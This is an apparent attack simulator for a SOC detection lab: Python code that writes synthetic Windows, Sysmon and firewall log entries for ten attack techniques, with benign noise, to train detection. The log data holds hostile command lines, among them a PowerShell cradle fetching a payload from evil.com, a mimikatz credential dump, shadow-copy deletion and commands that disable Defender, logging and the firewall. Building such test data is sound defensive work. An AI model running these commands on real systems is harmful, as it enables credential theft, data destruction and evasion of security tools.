"""
Enterprise SOC Detection Lab — Attack Simulator
Generates realistic attack scenarios with corresponding log entries for detection testing.
"""

import random
import json
from datetime import datetime, timedelta
from models import db, LogEntry


class AttackSimulator:
    """Simulates real-world attack scenarios and generates corresponding log entries."""

    INTERNAL_SUBNETS = ["10.0.1.", "10.0.2.", "10.0.3.", "192.168.1."]
    EXTERNAL_IPS = [
        "185.220.101.34", "91.219.237.8", "45.33.32.156", "198.51.100.7",
        "203.0.113.42", "94.102.49.193", "162.247.74.27", "178.62.197.110",
        "23.129.64.210", "104.244.76.13",
    ]
    HOSTNAMES = [
        "DC01", "DC02", "WS-FINANCE01", "WS-HR02", "WS-DEV03", "WS-EXEC01",
        "SRV-FILE01", "SRV-WEB01", "SRV-DB01", "SRV-MAIL01",
    ]
    USERS = [
        "admin", "j.smith", "m.jones", "a.kumar", "s.williams", "r.chen",
        "d.brown", "svc_backup", "svc_sql", "krbtgt",
    ]
    MALICIOUS_PROCESSES = [
        "mimikatz.exe", "rubeus.exe", "sharphound.exe", "cobalt_strike.exe",
        "psexec.exe", "wmic.exe", "certutil.exe", "bitsadmin.exe",
        "mshta.exe", "regsvr32.exe", "rundll32.exe",
    ]

    def __init__(self):
        self.generated_logs = []

    def _random_ts(self, hours_back=72):
        return datetime.utcnow() - timedelta(
            hours=random.randint(0, hours_back),
            minutes=random.randint(0, 59),
            seconds=random.randint(0, 59),
        )

    def _rand_internal_ip(self):
        return random.choice(self.INTERNAL_SUBNETS) + str(random.randint(10, 250))

    def _rand_external_ip(self):
        return random.choice(self.EXTERNAL_IPS)

    def _rand_host(self):
        return random.choice(self.HOSTNAMES)

    def _rand_user(self):
        return random.choice(self.USERS)

    def _create_log(self, **kwargs):
        log = LogEntry(**kwargs)
        self.generated_logs.append(log)
        return log

    # ── Attack Scenario 1: Brute Force ─────────────────────────────────────
    def simulate_brute_force(self, attempts=50):
        """Simulate brute force authentication attack (T1110)."""
        target_host = "DC01"
        target_user = "admin"
        attacker_ip = self._rand_external_ip()
        base_time = self._random_ts()

        for i in range(attempts):
            ts = base_time + timedelta(seconds=i * 2)
            success = i == attempts - 1
            self._create_log(
                timestamp=ts, source="windows_security", event_id=4625 if not success else 4624,
                severity="high" if not success else "critical",
                hostname=target_host, username=target_user,
                source_ip=attacker_ip, dest_ip="10.0.1.10",
                dest_port=3389,
                description=f"{'Successful' if success else 'Failed'} logon attempt ({i+1}/{attempts})",
                raw_log=json.dumps({
                    "EventID": 4624 if success else 4625,
                    "LogonType": 10, "TargetUserName": target_user,
                    "IpAddress": attacker_ip, "WorkstationName": target_host,
                    "Status": "0x0" if success else "0xC000006D",
                }),
                mitre_tactic="Credential Access", mitre_technique="T1110",
                is_malicious=True,
            )
        return f"Brute force simulation: {attempts} attempts from {attacker_ip}"

    # ── Attack Scenario 2: Credential Dumping ──────────────────────────────
    def simulate_credential_dumping(self):
        """Simulate credential dumping with mimikatz (T1003)."""
        host = "WS-FINANCE01"
        user = "a.kumar"
        ts = self._random_ts()

        # Process creation — mimikatz
        self._create_log(
            timestamp=ts, source="sysmon", event_id=1,
            severity="critical", hostname=host, username=user,
            source_ip="10.0.2.15", process_name="mimikatz.exe",
            process_id=random.randint(1000, 9999),
            parent_process="cmd.exe",
            command_line="mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
            hash_sha256="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            description="Credential dumping tool executed — mimikatz detected",
            mitre_tactic="Credential Access", mitre_technique="T1003",
            is_malicious=True,
        )
        # LSASS access
        self._create_log(
            timestamp=ts + timedelta(seconds=2), source="sysmon", event_id=10,
            severity="critical", hostname=host, username=user,
            source_ip="10.0.2.15", process_name="mimikatz.exe",
            description="Process accessed lsass.exe — credential theft indicator",
            raw_log=json.dumps({
                "EventID": 10, "SourceImage": "C:\\Temp\\mimikatz.exe",
                "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                "GrantedAccess": "0x1010",
            }),
            mitre_tactic="Credential Access", mitre_technique="T1003",
            is_malicious=True,
        )
        return "Credential dumping simulation: mimikatz execution on " + host

    # ── Attack Scenario 3: Lateral Movement ────────────────────────────────
    def simulate_lateral_movement(self):
        """Simulate lateral movement via PsExec/RDP (T1021)."""
        src_host = "WS-FINANCE01"
        targets = ["SRV-FILE01", "SRV-DB01", "DC01"]
        user = "admin"
        ts = self._random_ts()

        for i, target in enumerate(targets):
            self._create_log(
                timestamp=ts + timedelta(minutes=i * 5), source="windows_security",
                event_id=4624, severity="high",
                hostname=target, username=user,
                source_ip="10.0.2.15", dest_ip=f"10.0.1.{20 + i}",
                dest_port=445, process_name="psexec.exe",
                command_line=f"psexec.exe \\\\{target} -u {user} cmd.exe",
                description=f"Lateral movement to {target} via PsExec — Type 3 logon",
                raw_log=json.dumps({
                    "EventID": 4624, "LogonType": 3,
                    "TargetUserName": user, "IpAddress": "10.0.2.15",
                }),
                mitre_tactic="Lateral Movement", mitre_technique="T1021",
                is_malicious=True,
            )
        return f"Lateral movement simulation: {src_host} → {', '.join(targets)}"

    # ── Attack Scenario 4: PowerShell Abuse ────────────────────────────────
    def simulate_powershell_abuse(self):
        """Simulate malicious PowerShell execution (T1059.001)."""
        host = self._rand_host()
        user = self._rand_user()
        ts = self._random_ts()

        ps_commands = [
            "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
            "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\"",
            "powershell.exe -c \"[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp')\"",
            "powershell.exe -c \"Get-Process lsass | ForEach-Object { $_.Modules }\"",
        ]

        for i, cmd in enumerate(ps_commands):
            self._create_log(
                timestamp=ts + timedelta(seconds=i * 10), source="sysmon",
                event_id=1, severity="high",
                hostname=host, username=user,
                source_ip=self._rand_internal_ip(),
                process_name="powershell.exe",
                process_id=random.randint(1000, 9999),
                parent_process="cmd.exe" if i % 2 == 0 else "wmiprvse.exe",
                command_line=cmd,
                description=f"Suspicious PowerShell execution detected — encoded/download cradle",
                mitre_tactic="Execution", mitre_technique="T1059.001",
                is_malicious=True,
            )
        return f"PowerShell abuse simulation: {len(ps_commands)} malicious commands on {host}"

    # ── Attack Scenario 5: Persistence via Registry ────────────────────────
    def simulate_persistence_registry(self):
        """Simulate persistence through registry run keys (T1547.001)."""
        host = self._rand_host()
        user = self._rand_user()
        ts = self._random_ts()

        registry_keys = [
            r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\UpdateService",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\SecurityUpdate",
            r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SystemHelper",
        ]

        for i, key in enumerate(registry_keys):
            self._create_log(
                timestamp=ts + timedelta(minutes=i), source="sysmon",
                event_id=13, severity="high",
                hostname=host, username=user,
                source_ip=self._rand_internal_ip(),
                process_name="reg.exe",
                command_line=f'reg add "{key}" /v Payload /t REG_SZ /d "C:\\Temp\\backdoor.exe" /f',
                registry_key=key,
                description=f"Registry persistence mechanism installed — {key}",
                mitre_tactic="Persistence", mitre_technique="T1547.001",
                is_malicious=True,
            )
        return f"Registry persistence simulation: {len(registry_keys)} keys modified on {host}"

    # ── Attack Scenario 6: Kerberoasting ───────────────────────────────────
    def simulate_kerberoasting(self):
        """Simulate Kerberoasting attack (T1558.003)."""
        host = "WS-DEV03"
        user = "j.smith"
        ts = self._random_ts()

        service_accounts = ["svc_sql", "svc_backup", "svc_web", "svc_exchange"]
        for i, svc in enumerate(service_accounts):
            self._create_log(
                timestamp=ts + timedelta(seconds=i * 3), source="windows_security",
                event_id=4769, severity="high",
                hostname="DC01", username=user,
                source_ip="10.0.3.25", dest_ip="10.0.1.10",
                dest_port=88,
                description=f"TGS ticket requested for service account {svc} — Kerberoasting indicator",
                raw_log=json.dumps({
                    "EventID": 4769, "ServiceName": svc,
                    "TargetUserName": user, "TicketEncryptionType": "0x17",
                    "IpAddress": "10.0.3.25",
                }),
                mitre_tactic="Credential Access", mitre_technique="T1558.003",
                is_malicious=True,
            )
        return f"Kerberoasting simulation: {len(service_accounts)} service ticket requests by {user}"

    # ── Attack Scenario 7: DCSync ──────────────────────────────────────────
    def simulate_dcsync(self):
        """Simulate DCSync attack (T1003.006)."""
        host = "WS-DEV03"
        user = "j.smith"
        ts = self._random_ts()

        self._create_log(
            timestamp=ts, source="windows_security", event_id=4662,
            severity="critical", hostname="DC01", username=user,
            source_ip="10.0.3.25", dest_ip="10.0.1.10",
            description="Directory replication request from non-DC host — DCSync attack indicator",
            raw_log=json.dumps({
                "EventID": 4662, "SubjectUserName": user,
                "ObjectType": "domainDNS",
                "Properties": "Replicating Directory Changes All",
                "AccessMask": "0x100",
            }),
            mitre_tactic="Credential Access", mitre_technique="T1003.006",
            is_malicious=True,
        )
        return f"DCSync simulation: replication request from {host} ({user})"

    # ── Attack Scenario 8: Data Exfiltration ───────────────────────────────
    def simulate_data_exfiltration(self):
        """Simulate data exfiltration over C2 channel (T1041)."""
        host = "WS-EXEC01"
        user = "d.brown"
        c2_ip = "185.220.101.34"
        ts = self._random_ts()

        # Large outbound data transfers
        for i in range(5):
            size_mb = random.randint(50, 500)
            self._create_log(
                timestamp=ts + timedelta(minutes=i * 15), source="firewall",
                event_id=0, severity="high",
                hostname=host, username=user,
                source_ip="10.0.1.50", dest_ip=c2_ip,
                source_port=random.randint(49152, 65535), dest_port=443,
                description=f"Large outbound transfer: {size_mb}MB to external IP {c2_ip}",
                raw_log=json.dumps({
                    "action": "allow", "bytes_sent": size_mb * 1024 * 1024,
                    "dest_ip": c2_ip, "dest_port": 443,
                    "application": "ssl", "duration": random.randint(30, 300),
                }),
                mitre_tactic="Exfiltration", mitre_technique="T1041",
                is_malicious=True,
            )
        return f"Data exfiltration simulation: transfers to {c2_ip} from {host}"

    # ── Attack Scenario 9: Ransomware Behavior ────────────────────────────
    def simulate_ransomware(self):
        """Simulate ransomware behavior (T1486)."""
        host = "SRV-FILE01"
        user = "SYSTEM"
        ts = self._random_ts()

        # Volume shadow copy deletion
        self._create_log(
            timestamp=ts, source="sysmon", event_id=1,
            severity="critical", hostname=host, username=user,
            source_ip="10.0.1.30",
            process_name="vssadmin.exe", parent_process="cmd.exe",
            command_line="vssadmin.exe delete shadows /all /quiet",
            description="Volume shadow copy deletion — ransomware precursor activity",
            mitre_tactic="Impact", mitre_technique="T1486",
            is_malicious=True,
        )
        # Mass file encryption
        extensions = [".docx", ".xlsx", ".pdf", ".pptx", ".sql"]
        for i, ext in enumerate(extensions):
            self._create_log(
                timestamp=ts + timedelta(seconds=5 + i), source="sysmon",
                event_id=11, severity="critical",
                hostname=host, username=user,
                source_ip="10.0.1.30",
                process_name="svchost.exe",
                file_path=f"C:\\SharedDrive\\Finance\\report{i}{ext}.encrypted",
                description=f"File encryption detected: mass renaming to .encrypted extension",
                mitre_tactic="Impact", mitre_technique="T1486",
                is_malicious=True,
            )
        # Ransom note creation
        self._create_log(
            timestamp=ts + timedelta(seconds=30), source="sysmon",
            event_id=11, severity="critical",
            hostname=host, username=user,
            source_ip="10.0.1.30",
            process_name="svchost.exe",
            file_path="C:\\SharedDrive\\README_DECRYPT.txt",
            description="Ransom note dropped — ransomware confirmed",
            mitre_tactic="Impact", mitre_technique="T1486",
            is_malicious=True,
        )
        return f"Ransomware simulation: shadow copy deletion + file encryption on {host}"

    # ── Attack Scenario 10: Defense Evasion ────────────────────────────────
    def simulate_defense_evasion(self):
        """Simulate disabling security tools (T1562.001)."""
        host = self._rand_host()
        user = self._rand_user()
        ts = self._random_ts()

        evasion_commands = [
            ("sc stop WinDefend", "Windows Defender service stopped"),
            ("Set-MpPreference -DisableRealtimeMonitoring $true", "Real-time monitoring disabled"),
            ("wevtutil cl Security", "Security event log cleared"),
            ("netsh advfirewall set allprofiles state off", "Windows Firewall disabled"),
        ]

        for i, (cmd, desc) in enumerate(evasion_commands):
            proc = "powershell.exe" if "Set-Mp" in cmd else "cmd.exe"
            self._create_log(
                timestamp=ts + timedelta(seconds=i * 5), source="sysmon",
                event_id=1, severity="critical",
                hostname=host, username=user,
                source_ip=self._rand_internal_ip(),
                process_name=proc, parent_process="explorer.exe",
                command_line=cmd,
                description=f"Defense evasion: {desc}",
                mitre_tactic="Defense Evasion", mitre_technique="T1562.001",
                is_malicious=True,
            )
        return f"Defense evasion simulation: security tools disabled on {host}"

    # ── Benign Traffic Generation ──────────────────────────────────────────
    def generate_benign_traffic(self, count=200):
        """Generate benign/normal log entries for noise and baseline."""
        benign_events = [
            {"source": "windows_security", "event_id": 4624, "desc": "Successful logon", "sev": "informational"},
            {"source": "windows_security", "event_id": 4634, "desc": "Account logoff", "sev": "informational"},
            {"source": "sysmon", "event_id": 1, "desc": "Process started", "sev": "informational"},
            {"source": "sysmon", "event_id": 3, "desc": "Network connection", "sev": "low"},
            {"source": "firewall", "event_id": 0, "desc": "Allowed connection", "sev": "informational"},
            {"source": "windows_security", "event_id": 4688, "desc": "New process created", "sev": "informational"},
        ]
        benign_processes = [
            "explorer.exe", "chrome.exe", "outlook.exe", "notepad.exe",
            "excel.exe", "word.exe", "teams.exe", "svchost.exe",
        ]

        for _ in range(count):
            evt = random.choice(benign_events)
            self._create_log(
                timestamp=self._random_ts(168),
                source=evt["source"], event_id=evt["event_id"],
                severity=evt["sev"],
                hostname=self._rand_host(), username=self._rand_user(),
                source_ip=self._rand_internal_ip(),
                dest_ip=self._rand_internal_ip(),
                source_port=random.randint(49152, 65535),
                dest_port=random.choice([80, 443, 445, 3389, 5985, 8080]),
                process_name=random.choice(benign_processes),
                process_id=random.randint(100, 9999),
                description=evt["desc"],
                is_malicious=False,
            )
        return f"Generated {count} benign log entries"

    def run_all_scenarios(self):
        """Execute all attack simulations and generate background noise."""
        results = []
        results.append(self.simulate_brute_force())
        results.append(self.simulate_credential_dumping())
        results.append(self.simulate_lateral_movement())
        results.append(self.simulate_powershell_abuse())
        results.append(self.simulate_persistence_registry())
        results.append(self.simulate_kerberoasting())
        results.append(self.simulate_dcsync())
        results.append(self.simulate_data_exfiltration())
        results.append(self.simulate_ransomware())
        results.append(self.simulate_defense_evasion())
        results.append(self.generate_benign_traffic(300))

        # Persist all logs to database
        for log in self.generated_logs:
            db.session.add(log)
        db.session.commit()

        return results
